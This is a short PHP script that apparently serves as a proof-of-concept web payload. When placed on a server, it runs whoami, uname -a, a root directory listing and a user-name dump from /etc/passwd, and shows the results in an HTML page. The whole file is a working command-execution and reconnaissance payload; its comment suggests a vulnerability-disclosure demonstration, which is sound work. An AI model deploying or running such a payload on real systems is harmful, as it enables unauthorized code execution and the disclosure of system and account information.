<?php 
echo "<html><body>";
echo "\n--------------------------------\n";
echo "<pre>Command: whoami<br><br>$output</pre>";
passthru("whoami");
echo "<br>\n--------------------------------\n";
$output = exec("uname -a");
echo "<pre>Command: uname -a /<br><br>$output</pre>";
echo "<br>\n--------------------------------\n";
$output = shell_exec("ls -alh /");
echo "<pre>Command: ls -alh /<br><br>$output</pre>";
echo "<br>\n--------------------------------\n";
$output = shell_exec("cut -d: -f1 /etc/passwd");
echo "<pre>Command: cut -d: -f1 /etc/passwd<br>(Output Specially truncated in order to avoid excessive information disclosure)<br><br>$output</pre>";
echo "\n--------------------------------\n</br>"; 
echo "</html></body>";
?>